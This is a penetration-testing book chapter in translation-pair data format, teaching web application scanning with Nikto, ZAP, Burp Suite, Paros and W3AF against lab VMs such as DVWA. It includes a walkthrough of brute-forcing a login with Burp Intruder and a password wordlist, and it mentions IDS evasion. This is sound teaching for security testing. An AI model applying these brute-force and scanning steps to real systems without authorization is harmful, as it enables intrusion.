- en: Web Application Testing
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In [Chapter 6](22aec58c-fc6d-4d03-9af6-4761ab499562.xhtml), *Vulnerability Scanning, *we
    looked at performing vulnerability scanning using Nessus and OpenVAS, two very
    powerful tools. In this chapter, we will be taking a look at tools specifically
    for web and web application scanning and attacking.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
- en: Most applications that are developed these days integrate different web technologies.
    This increases the complexity and risk of exposing sensitive data. Web applications
    have always been a long-standing target for malicious adversaries to steal, manipulate,
    sabotage, and extort corporate businesses. This proliferation of web applications
    has brought forth enormous challenges for pentesters. The key is to secure a web
    application's frontend, its backend usually consists of databases, any additional
    microservices, and the overall network security. This is necessary because web
    applications act as a data-processing system, and the database is responsible
    for storing sensitive data (for example, credit cards, customer details, and authentication
    data).
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
- en: The tools that we are going to look at in this chapter include web application
    recon and vulnerability scanners, proxies, database attack types, web attack tools,
    and some client/browser attack tools.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
- en: Technical requirements
  id: totrans-4
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'You will need the following  for this chapter:'
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
- en: Kali Linux
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**OWASP Broken Web Applications** (**BWA**)'
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: OWASP BWA is a preconfigured virtual machine from OWASP that has a collection
    of vulnerable web applications. We'll be working with one of the apps on the VM and
    that's **Damn Vulnerable Web App** (**DVWA**).
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
- en: Web analysis
  id: totrans-9
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this section, we'll be looking at the tools used to identify possible vulnerabilities
    in web applications. Some of these tools, specifically Burp Suite and OWASP ZAP,
    go beyond performing vulnerability assessments against web and cloud applications
    and provide you with the ability to attack these vulnerabilities, and you will
    see them appear further into the chapter.
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
- en: Based on the information we gather from the results of the various tools, we
    will be able to determine our attack vectors in attempts to gain access to the
    system through password attacks or exfiltrate data from databases or the system
    itself.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
- en: Nikto
  id: totrans-12
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Nikto is a basic web server security scanner. It scans and detects the vulnerabilities
    on web applications usually caused by misconfigurations on the server, default
    and insecure files, and outdated server applications. As Nikto is purely built
    on LibWhisker2, it supports out-of-the-box cross-platform deployment, SSL, host
    authentication methods (NTLM/Basic), proxies, and several IDS-evasion techniques.
    It also supports sub-domain enumeration, application security checks (XSS, SQL
    injection, and so on), and is capable of guessing authorization credentials using
    a dictionary-based password attack.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
- en: 'To use `nikto`, you can navigate to the Applications menu | 03 – Web Application
    Analysis | Web Vulnerability Scanner | nikto, or in your Terminal simply type
    the following:'
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  id: totrans-15
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: Nikto can also be easily found by navigating to Applications | Vulnerability
    Analysis | nikto.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
- en: 'By default, as previously seen with other applications, simply running the
    command will display the different options that we have available. To scan a target,
    enter `nikto -h <target> -p <port>`, where `<target>` is the domain or IP address
    of your target website and `<port>` is the port that the service is running on.
    For this scan, `nikto` will be targeted at a local VM known as the OSWAP BWA (available
    at [https://sourceforge.net/projects/owaspbwa/files/](https://sourceforge.net/projects/owaspbwa/files/)).
    OWASP BWA is a collection of deliberately vulnerable web applications in one VMware-based
    virtual machine:'
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/4401d8d5-6695-46f9-b4bd-56b535d2d504.jpg)'
  id: totrans-18
  prefs: []
  type: TYPE_IMG
- en: 'Reading through the snippet of results in the screen capture, in the first
    few lines, `nikto` tells us the IP address of the target and the hostname. After
    the basic target information, `nikto` displays the web server that''s running
    and its version, Apache 2.2.14, on a Ubuntu system with some modules that were
    loaded, for example `mod_perl/2.0.4` and `OpenSSL/0.9.8k`. Continuing down, we
    see some useful information, such as the path to the CGI folder (`/cgi-bin/`),
    and that some of the modules loaded are outdated:'
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/98aa5ffd-fddf-460b-b1a9-4159f36b5e47.jpg)'
  id: totrans-20
  prefs: []
  type: TYPE_IMG
- en: Further down in the results, `nikto` displays OSVDB codes. OSVDB is the abbreviation
    for Open Source Vulnerability Database. This was an initiative started by professionals
    in the security industry officially in 2004 and was a database that stored technical
    information on security vulnerabilities (a vast majority being web application-related).
    Unfortunately, the service shut down in April 2016 due to lack of support and
    contributions, however, the team over at [http://cve.mitre.org](http://cve.mitre.org)
    have compiled a reference map that references the OSVDB to CVE entries ([http://cve.mitre.org/data/refs/refmap/source-OSVDB.html](http://cve.mitre.org/data/refs/refmap/source-OSVDB.html)).
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
- en: 'This can be used to get more details on the OSVDB codes that `nikto` has provided:'
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/87281aa4-a850-4ff6-8a16-938ce0c7320c.jpg)'
  id: totrans-23
  prefs: []
  type: TYPE_IMG
- en: 'Nikto has the functionality to identify web application vulnerabilities, such
    as information disclosure, injection (XSS/Script/HTML), remote file retrieval
    (server-wide), command execution, and software identification. In addition to
    the basic scanning demonstrated, Nikto allows the penetration tester to tailor
    scans to their particular target. The following are some of the options that can
    be utilized for scanning:'
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
- en: Using the `-T` command-line switch with individual test numbers will tailor
    the testing to specific types
  id: totrans-25
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: By using `–t`, you can set the timeout value for each test response
  id: totrans-26
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`-D V` controls the display output'
  id: totrans-27
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`-o` and `-F` define the scan report to be written in a particular format'
  id: totrans-28
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: There are other advanced options, such as `–mutate` (to guess subdomains, files,
    directories, and usernames), `-evasion` (to bypass the IDS filter), and `-Single`
    (for single test mode), which you can use to assess your target in depth
  id: totrans-29
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: OWASP ZAP
  id: totrans-30
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: '**OWASP Zed Attack Proxy** (**ZAP**) is a web application vulnerability scanner.
    Created by the OWASP project, this is a Java-based open source scanner that has
    a great deal of functionality. It includes web crawlers, vulnerability identification,
    and fuzzing analysis, and can serve as a web proxy. To launch ZAP, go to Applications
    | Web Application Analysis | owasp-zap, or in the Terminal enter:'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  id: totrans-32
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: '![](img/71e97514-84d9-4bcf-94c0-aed7c744a4f0.jpg)'
  id: totrans-33
  prefs: []
  type: TYPE_IMG
- en: 'Once loaded, it''s easy to get started with scanning the target site. On the
    main screen in ZAP, there is a field to enter the address of the target. This
    time, the target is one of the vulnerable web apps on the BWA virtual machine,
    DVWA. After entering the target, click the Attack button and watch ZAP go to work:'
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/313b3bfa-343c-4254-9121-6ccdfdb10b43.jpg)'
  id: totrans-35
  prefs: []
  type: TYPE_IMG
- en: 'The results of the scan appear in the bottom on the main screen. The first
    step that ZAP takes when scanning a site is to identify, or crawl, the entire
    site, following links that are associated with the host:'
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/894b06db-1646-4a85-8ee5-85681d03bbe1.jpg)'
  id: totrans-37
  prefs: []
  type: TYPE_IMG
- en: 'After crawling the site, ZAP conducts a number of different checks against
    common web application vulnerabilities. These are indicated under the Alerts tab
    in the bottom left-hand corner. For example, the following are the vulnerabilities
    identified by ZAP on the DVWA application:'
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/ff9e27d1-3cb4-4a63-a676-ce663c9497c6.jpg)'
  id: totrans-39
  prefs: []
  type: TYPE_IMG
- en: 'You can then drill down on specific site pathways to determine exactly where
    these vulnerabilities present themselves; in this case, we see that `login.php`
    is vulnerable to SQL injection:'
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/b82cf09a-af57-475c-ae2a-e0ade2de65f1.jpg)'
  id: totrans-41
  prefs: []
  type: TYPE_IMG
- en: Scanning is just the surface of all the tools ZAP has to offer. For more information
    about ZAP, OWASP has resources located at [https://www.owasp.org/index.php/ZAP](https://www.owasp.org/index.php/ZAP).
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
- en: Burp Suite
  id: totrans-43
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Burp Suite is a combination of powerful web application security tools. These
    tools demonstrate the real-world capabilities of an attacker penetrating web applications.
    They can scan, analyze, and exploit web applications using manual and automated
    techniques. The integration facility between the interfaces of these tools provides
    a complete attack platform to share information between one or more tools. This
    makes the Burp Suite a very effective and easy-to-use web application attack framework.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
- en: 'To start Burp Suite, navigate to Applications | Web Application Analysis |
    burpsuite or use the Terminal to execute the following command:'
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  id: totrans-46
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: 'When Burp is launched for the first time, you''ll be asked to accept the Terms
    and Conditions and also set up your Project Environment (leaving everything default
    is sufficient for now):'
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/deadaeb5-fd90-4dc5-89bb-039702b87c09.jpg)'
  id: totrans-48
  prefs: []
  type: TYPE_IMG
- en: 'You will be presented with a Burp Suite window on your screen. All the integrated
    tools (Target, Proxy, Spider, Scanner, Intruder, Repeater, Sequencer, Decoder,
    and Comparer) can be accessed via their individual tabs. You can get more details
    about their usage and configuration through the Help menu or by visiting [http://www.portswigger.net/burp/help/](http://www.portswigger.net/burp/help/).
    Please note that Burp Suite is available in three different editions: **Free (Community)**,
    Professional, and Enterprise. The free community edition is the version available
    in Kali.'
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
- en: As mentioned before, Burp Suite comes with its own Spider. The application-aware
    spider, or burpspider, is a web crawler, which is essentially a bot that systematically
    browses a target site along with all its inner pages and maps its structure.
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
- en: 'For our example, we''ll be using Burp to crack the login credentials to gain
    access to the DVWA application. First, we need to set up our proxy and verify
    that the IP is set to the localhost IP and the port should be `8080`. Go to the
    Proxy tab followed by the Options sub-tab:'
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/500cfbaf-39f8-4531-b1fc-429fc5fdae33.jpg)'
  id: totrans-52
  prefs: []
  type: TYPE_IMG
- en: 'Also, verify that the Intercept option is on under the Proxy tab, then check
    for Intercept is on tab:'
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/78a997ee-8fc4-4016-964d-ab11dfc64b0d.jpg)'
  id: totrans-54
  prefs: []
  type: TYPE_IMG
- en: Once completed, open your browser and head to Options | Preferences | Advanced
    | Network | Connection Settings.
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
- en: 'You''ll need to set the browser to your proxy now:'
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/fb5bfd99-ef09-473d-98b9-5659485d304e.jpg)'
  id: totrans-57
  prefs: []
  type: TYPE_IMG
- en: 'So that''s our initial setup. Now, we''ll need to visit the target site, in
    this case, `192.168.0.32/dvwa`:'
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/baed0a38-4877-4f90-ab62-fe196228c75c.jpg)'
  id: totrans-59
  prefs: []
  type: TYPE_IMG
- en: 'Once the address is entered, it should remain in a connecting loop. However,
    if you look at the Burp Suite interface, you can see some data:'
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/57d34d84-fafe-40d5-be39-4428f087ac79.jpg)'
  id: totrans-61
  prefs: []
  type: TYPE_IMG
- en: After clicking Forward a few times, the browser should load to the web page.
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
- en: 'In Burp Suite, under the Target tab, you will now have some data in the Site
    Map tab:'
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/ffe3b02e-aa62-42dd-8b87-d02c6371503d.jpg)'
  id: totrans-64
  prefs: []
  type: TYPE_IMG
- en: From there, it's a matter of right-clicking on the host and selecting Spider
    From here or Spider From Host.
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
- en: Now, somewhere along the line, you should get a popup indicating that burpspider
    has found a form that is requesting some information. Burpspider will always pop
    up when it finds a form. Remember, forms can request user credentials or can be
    a simple search/query/lookup form.
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
- en: 'With that said, in our case, it''s a login form:'
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/a0bb27ac-f263-4dcc-946c-07d7ba2d49a1.jpg)'
  id: totrans-68
  prefs: []
  type: TYPE_IMG
- en: Back on our page on the target site, let's generate some traffic for Burp Suite's
    Intruder tool by entering some random credentials in the login form on the page.
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
- en: 'After entering the credentials, look at our interceptor:'
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/a6502260-533e-414e-a79e-64c5eafd4fc9.jpg)'
  id: totrans-71
  prefs: []
  type: TYPE_IMG
- en: Note the key information we get, the username and password, and verify on the
    web page how it indicates to us that the credentials we entered were wrong. In
    this case, it tells us `Login` failed in a simple string message, however, there
    may be times where it may be a popup or a cookie.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 注意我们得到的关键信息，用户名和密码，并在网页上验证它如何告诉我们我们输入的凭据是错误的。在这种情况下，它告诉我们`登录`失败了，是一个简单的字符串消息，然而，有时可能会是一个弹出窗口或一个cookie。
- en: Now, right-click the target and select Send to Intruder.
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，右键单击目标，选择发送到Intruder。
- en: 'Under the Intruder tab, select the Positions tab:'
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 在Intruder选项卡下，选择Positions选项卡：
- en: '![](img/3ff47182-3ac5-4e01-b239-acc188de7372.jpg)'
  id: totrans-75
  prefs: []
  type: TYPE_IMG
  zh: '![](img/3ff47182-3ac5-4e01-b239-acc188de7372.jpg)'
- en: The username and password are the text we entered as the username and the password.
    Note that by default, more fields or positions may be highlighted. To clear these,
    simply click on the field we don't want and click the Clear button to the right.
    These fields or positions are where Intruder will replace it with payloads that
    we define, in this case, usernames and passwords.
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 用户名和密码是我们输入的用户名和密码。请注意，默认情况下，可能会突出显示更多字段或位置。要清除这些字段，只需单击我们不想要的字段，然后单击右侧的清除按钮。这些字段或位置是Intruder将用我们定义的负载替换的地方，本例中是用户名和密码。
- en: 'Before we continue, verify that the Attack type is set to Cluster bomb. Now,
    go to the Payloads tab:'
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 在继续之前，请验证攻击类型是否设置为Cluster bomb。现在，转到Payloads选项卡：
- en: '![](img/e6077949-ce94-45ef-9d32-fb0966c9eac5.jpg)'
  id: totrans-78
  prefs: []
  type: TYPE_IMG
  zh: '![](img/e6077949-ce94-45ef-9d32-fb0966c9eac5.jpg)'
- en: When you click on the Payload set drop-down menu, the count in there should
    reflect the number of positions in the Positions tab.
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 当您点击负载集下拉菜单时，其中的计数应反映在位置选项卡中的位置数。
- en: Now, select 1, which will correspond to the username field, and set Payload
    type to Simple list. In the Payload Options section under the Payload Sets section,
    enter the username in the text field labelled Enter a new item and then click
    Add. This will be used by Intruder as the username. You can add multiple usernames.
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，选择1，这将对应用户名字段，并将负载类型设置为Simple list。在Payload Sets部分的Payload Options部分中，输入用户名在标有“输入新项目”的文本字段中，然后点击添加。这将被Intruder用作用户名。您可以添加多个用户名。
- en: 'For now, I''ll enter only the `admin` username to test with:'
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 目前，我只会输入`admin`用户名进行测试：
- en: '![](img/736cd79a-37b5-4466-8eb4-74c662418ba4.jpg)'
  id: totrans-82
  prefs: []
  type: TYPE_IMG
  zh: '![](img/736cd79a-37b5-4466-8eb4-74c662418ba4.jpg)'
- en: 'Now, let''s set Payload set 2, which is the password field. Instead of entering
    passwords one by one, click on the Load button and load up one of your password
    files (`rockyou.txt` is located in Kali at `/usr/share/wordlist`):'
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们设置负载集2，即密码字段。不要逐个输入密码，点击加载按钮，加载你的密码文件之一（`rockyou.txt`位于Kali的`/usr/share/wordlist`中）：
- en: '![](img/16ce6bca-de95-4800-a252-50fc65fef984.jpg)'
  id: totrans-84
  prefs: []
  type: TYPE_IMG
  zh: '![](img/16ce6bca-de95-4800-a252-50fc65fef984.jpg)'
- en: 'Once all is set, click Start attack:'
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 一切设置好后，点击开始攻击：
- en: '![](img/d3de747d-c506-46fb-8876-c5dd852c0029.jpg)'
  id: totrans-86
  prefs: []
  type: TYPE_IMG
  zh: '![](img/d3de747d-c506-46fb-8876-c5dd852c0029.jpg)'
- en: This screenshot shows the Results pop-up window. Looking at the results, all
    attempts got a Status (HTTP Response code) of `302`. A quick Google of HTTP response
    codes indicates that this leads to a redirect, but a redirect to where?
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 这个截图显示了结果弹出窗口。查看结果，所有尝试都得到了`302`的状态（HTTP响应代码）。快速搜索HTTP响应代码表明这会导致重定向，但重定向到哪里呢？
- en: If we click on each result and then select the Response tab, you would see that
    the only result that redirects to `index.php` is `admin:password`. We can now
    go to the DVWA login page and enter the credentials, granting access to the site.
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们点击每个结果，然后选择响应选项卡，你会看到唯一重定向到`index.php`的结果是`admin:password`。现在我们可以转到DVWA登录页面，输入凭据，获得对该站点的访问权限。
- en: We can also verify this in Burp Suite by using another tool, Repeater. Repeater
    is used to manually modify the HTTP requests and data being sent in the requests.
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还可以通过Burp Suite中的另一个工具Repeater来验证这一点。Repeater用于手动修改HTTP请求和请求中发送的数据。
- en: Going back to the Target tab, select the `POST` request for `login.php`. This
    is the form request that is sending the username and password. Right-click it
    and choose Send to Repeater.
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 回到目标选项卡，选择`login.php`的`POST`请求。这是发送用户名和密码的表单请求。右键单击它，选择发送到Repeater。
- en: 'Now, select the Repeater tab:'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，选择Repeater选项卡：
- en: '![](img/8909c91a-5ac7-4917-868f-453a9b07042e.jpg)'
  id: totrans-92
  prefs: []
  type: TYPE_IMG
  zh: '![](img/8909c91a-5ac7-4917-868f-453a9b07042e.jpg)'
- en: 'After `password=`, remove the incorrect password and enter the password that
    redirected us to `index.php`. In this case, the password is `password`. Once done,
    click Go:'
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 在`password=`之后，删除错误的密码，输入将我们重定向到`index.php`的密码。在这种情况下，密码是`password`。完成后，点击Go：
- en: '![](img/c08a5aa8-f955-4454-aeae-020e3c90b1e8.jpg)'
  id: totrans-94
  prefs: []
  type: TYPE_IMG
  zh: '![](img/c08a5aa8-f955-4454-aeae-020e3c90b1e8.jpg)'
- en: 'In the Response panel, we see Location: `index.php`. Now, click the Follow
    redirection button on the top. This produces the raw HTML, as well as a rendering,
    under the Render tab, of what the page should look like:'
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 在响应面板中，我们看到Location:`index.php`。现在，点击顶部的`跟随重定向`按钮。这会产生原始HTML，以及在渲染选项卡下的渲染，显示页面应该是什么样子的：
- en: '![](img/0c221a0c-1994-42de-83b5-f892d27729de.jpg)'
  id: totrans-96
  prefs: []
  type: TYPE_IMG
  zh: '![](img/0c221a0c-1994-42de-83b5-f892d27729de.jpg)'
- en: In this example, we used a few of the common tools that come with Burp Suite.
    Burp Suite, as an all-in-one application-security toolkit, is a very extensive
    and powerful web application attack platform.
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个例子中，我们使用了Burp Suite提供的一些常用工具。作为一款集成了所有功能的应用安全工具包，Burp Suite是一个非常全面和强大的Web应用程序攻击平台。
- en: Explaining every part of it is outside the scope of this book; therefore, we
    strongly suggest that you visit the website ([http://www.portswigger.net](http://www.portswigger.net))
    for more detailed examples.
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 解释每个部分超出了本书的范围；因此，我们强烈建议您访问该网站（[http://www.portswigger.net](http://www.portswigger.net)）以获取更详细的示例。
- en: Paros proxy
  id: totrans-99
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Paros代理
- en: 'Paros proxy is a valuable and intensive vulnerability-assessment tool. It spiders
    through the entire website and executes various vulnerability tests. It also allows
    an auditor to intercept web traffic (HTTP/HTTPS) by setting up a local proxy between
    the browser and the actual target application. This mechanism helps an auditor
    tamper with or manipulate particular requests being made to the target application,
    in order to test it manually. Hence, Paros proxy acts as an active and passive
    web application security assessment tool. To start Paros proxy, navigate to Applications
    | Web Application Analysis | paros or in a Terminal, enter the following command:'
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  id: totrans-101
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: This will bring up the Paros proxy window. Before you go through any practical
    exercises, you need to set up a local proxy (`127.0.0.1, 8080`) in your favorite
    browser. If you need to change any default settings, navigate to Tools | Options
    in the menu bar. This will allow you to modify the connection settings, local
    proxy values, HTTP authentication, and other relevant information. Once your browser
    has been set up, visit your target website.
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
- en: 'The following are the steps for vulnerability testing and obtaining its report:'
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
- en: In our case, we browse through `http://192.168.0.30/mutillidae` and notice that
    it has appeared under the Sites tab of the Paros Proxy.
  id: totrans-104
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Right-click on `http://192.168.0.30/mutillidae` and choose Spider to crawl through
    the entire website. This will take a few minutes, depending on how big your website
    is.
  id: totrans-105
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Once the website crawling has finished, you can see all of the discovered pages
    in the Spider tab at the bottom. Additionally, you can chase up the particular
    request and response for a desired page by selecting the target website, and choosing
    a specific page on the left-hand panel of the Sites tab.
  id: totrans-106
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: In order to trap any further requests and responses, go to the Trap tab on the
    right-hand panel. This is particularly useful when you decide to throw some manual
    tests against the target application. Moreover, you can construct your own HTTP
    request by navigating to Tools | Manual Request Editor.
  id: totrans-107
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: To execute the automated vulnerability testing, we select the target website
    under the Sites tab and navigate to Analyze | Scan All from the menu. Note that
    you can still select the specific types of security tests by navigating to Analyze
    | Scan Policy and then navigating to Analyze | Scan instead of Scan All.
  id: totrans-108
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Once the vulnerability testing is complete, you can see a number of security
    alerts on the Alerts tab at the bottom. These are categorized as High, Low, and
    Medium risk levels.
  id: totrans-109
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'If you would like the scan report, navigate to Report | Last Scan Report in
    the menu bar. This will generate a report that lists all of the vulnerabilities
    found during the test session (`/root/paros/session/LatestScannedReport.html`):'
  id: totrans-110
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/edc4ac8f-5744-4a3c-8e2d-9de0529c6379.png)'
  id: totrans-111
  prefs: []
  type: TYPE_IMG
- en: We made use of the basic vulnerability-assessment test for our exemple scenario.
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
- en: To become more familiar with various options offered by the Paros proxy, we
    recommend you read the user guide available at: [http://www.ipi.com/Training/SecTesting/paros_user_guide.pdf](http://www.ipi.com/Training/SecTesting/paros_user_guide.pdf).
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
- en: W3AF
  id: totrans-114
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'W3AF is a feature-rich web application attack-and-audit framework that aims
    to detect and exploit web vulnerabilities. The whole application-security assessment
    process is automated, and the framework is designed to follow three major steps:
    discover, audit, and attack. Each of these steps includes several plugins that
    might help the auditor focus on specific testing criteria. All of these plugins
    can communicate and share test data in order to achieve the required goal. It
    supports the detection and exploitation of multiple web application vulnerabilities,
    including SQL injection, cross-site scripting, remote and local file inclusion,
    buffer overflows, XPath injections, OS commanding, and application misconfiguration.'
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
- en: To get more information about each available plugin, go to [http://w3af.sourceforge.net/plugin-descriptions.php](http://w3af.sourceforge.net/plugin-descriptions.php).
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 要获取有关每个可用插件的更多信息，请转到[http://w3af.sourceforge.net/plugin-descriptions.php](http://w3af.sourceforge.net/plugin-descriptions.php)。
- en: 'To start W3AF, navigate to Applications | Web Vulnerability Analysis | w3af,
    or, in a Terminal, type the following:'
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 要启动W3AF，请转到应用程序 | Web漏洞分析 | w3af，或者在终端中输入以下内容：
- en: '[PRE4]'
  id: totrans-118
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'This will drop you into a personalized W3AF console mode (`w3af>>>`). Note
    that the GUI version of this tool is also available in the location of the same
    menu, but we have chosen to introduce the console version to you because of its
    flexibility and customization:'
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: 这将使您进入个性化的W3AF控制台模式（`w3af>>>`）。请注意，该工具的GUI版本也可在相同菜单的位置找到，但我们选择向您介绍控制台版本，因为它具有灵活性和可定制性：
- en: '[PRE5]'
  id: totrans-120
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'This will display all of the basic options that can be used to configure the
    test. You can use the help command whenever you require any assistance following
    a specific option. In our exercise, we will configure the output plugin, enable
    the selected audit tests, set up the target, and execute the scan process against
    the target website, using the following commands:'
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 这将显示可用于配置测试的所有基本选项。每当您需要任何特定选项的帮助时，都可以使用帮助命令。在我们的练习中，我们将配置输出插件，启用所选的审计测试，设置目标，并对目标网站执行扫描过程，使用以下命令：
- en: '`w3af>>> plugins`'
  id: totrans-122
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af>>> 插件`'
- en: '`w3af/plugins>>> help`'
  id: totrans-123
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins>>> 帮助`'
- en: '`w3af/plugins>>> output`'
  id: totrans-124
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins>>> 输出`'
- en: '`w3af/plugins>>> output console, html_file`'
  id: totrans-125
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins>>> 输出控制台，html文件`'
- en: '`w3af/plugins>>> output confightml_file`'
  id: totrans-126
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins>>> 输出配置html文件`'
- en: '`w3af/plugins/output/config:html_file>>> help`'
  id: totrans-127
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins/output/config:html_file>>> 帮助`'
- en: '`w3af/plugins/output/config:html_file>>> view`'
  id: totrans-128
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins/output/config:html_file>>> 查看`'
- en: '`w3af/plugins/output/config:html_file>>> set verbose True`'
  id: totrans-129
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins/output/config:html_file>>> 设置详细 True`'
- en: '`w3af/plugins/output/config:html_file>>> set output_file metasploitable.html`'
  id: totrans-130
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins/output/config:html_file>>> 设置输出文件 metasploitable.html`'
- en: '`w3af/plugins/output/config:html_file>>> back`'
  id: totrans-131
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins/output/config:html_file>>> 返回`'
- en: '`w3af/plugins>>> output config console`'
  id: totrans-132
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins>>> 输出配置控制台`'
- en: '`w3af/plugins/output/config:console>>> help`'
  id: totrans-133
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins/output/config:console>>> 帮助`'
- en: '`w3af/plugins/output/config:console>>> view`'
  id: totrans-134
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins/output/config:console>>> 查看`'
- en: '`w3af/plugins/output/config:console>>> set verbose False`'
  id: totrans-135
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins/output/config:console>>> 设置详细 False`'
